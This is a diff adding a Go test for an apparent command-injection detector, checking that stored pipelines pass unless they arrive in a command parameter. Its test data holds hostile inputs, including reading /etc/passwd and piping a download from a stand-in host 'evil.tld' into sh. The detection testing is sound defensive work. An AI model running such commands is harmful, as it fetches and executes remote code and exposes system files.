@@ -324,3 +324,57 @@ func TestMediaTypeSemicolonIsNotASeparator(t *testing.T) {
 		}
 	}
 }
+
+// TestCommandSinkParameterDefeatsStoredCommandLine is the other half of the
+// isStoredCommandLine decision.
+//
+// That check is right in general: "cat VERSION | tr" saved in a text field is a
+// pipeline someone stored, and reading its own separators as injection points
+// would block every CI configuration in existence. But the whole reason
+// "cmd=echo -n X|md5sum" is a CVE is the parameter it arrived in -- an
+// application that takes a parameter called cmd and hands it to a shell is
+// exactly the bug, and there the stored-command-line reading is the attacker's.
+//
+// The parameter name is the evidence, so it comes from the operator's context
+// rather than from the bytes.
+func TestCommandSinkParameterDefeatsStoredCommandLine(t *testing.T) {
+	d := New()
+
+	t.Run("stored command lines stay quiet without the parameter", func(t *testing.T) {
+		for _, benign := range []string{
+			"cat VERSION | tr -d '\\n'",
+			"echo -n X|md5sum",
+			"npm run build && npm test",
+		} {
+			if v := d.AnalyzeIn([]byte(benign), false); v.Detected() {
+				t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
+			}
+		}
+	})
+
+	t.Run("the same values in a command parameter fire", func(t *testing.T) {
+		for _, attack := range []string{
+			"echo -n X|md5sum",
+			"cat /etc/passwd",
+			"npm run build && curl http://evil.tld/x|sh",
+			"ping -c 1 127.0.0.1",
+		} {
+			if v := d.AnalyzeIn([]byte(attack), true); !v.Detected() {
+				t.Errorf("missed %q in a command sink (score %d, signals %v)", attack, v.Score, v.Signals)
+			}
+		}
+	})
+
+	t.Run("ordinary values in a command parameter still pass", func(t *testing.T) {
+		// "cmd=list" is how half of all admin UIs are written. The parameter
+		// name lifts the suppression; it does not lower the bar for evidence.
+		for _, benign := range []string{
+			"list", "getSelectAllId", "save", "update-profile", "3", "",
+			"show me the report", "user@example.com",
+		} {
+			if v := d.AnalyzeIn([]byte(benign), true); v.Detected() {
+				t.Errorf("false positive on %q in a command sink (score %d, signals %v)", benign, v.Score, v.Signals)
+			}
+		}
+	})
+}
